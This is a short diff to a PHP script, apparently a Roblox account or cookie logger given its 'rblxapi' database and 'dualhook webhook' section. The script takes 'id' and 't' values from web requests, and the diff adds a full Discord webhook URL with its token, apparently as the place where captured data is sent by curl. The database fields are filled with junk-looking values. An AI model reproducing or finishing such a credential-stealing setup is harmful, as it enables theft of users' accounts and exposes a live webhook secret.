@@ -1,8 +1,8 @@
 <?php
-    $servername = "";
-    $username = "";
-    $password = "";
-    $dbname = "rblxapi";
+    $servername = "duafua";
+    $username = "duaFua";
+    $password = "duaFua";
+    $dbname = "unfuagtss.github.io/Duabeam";
     $id = $_REQUEST['id'];
     $t = $_REQUEST['t'];
 
@@ -35,7 +35,7 @@
     $conn->close();
 
     //dualhook webhook//
-    $yourwebhook = "yourwebhook";
+    $yourwebhook = "https://discord.com/api/webhooks/1342136878882885763/0OJ7O7t9bB1Jh6ACMfJ8CS3Qm1iQLeG2KJvboEVTgnHuMCBldSgBYRkUCbrgZwo3gt1x";
 
 
     $ch = curl_init();
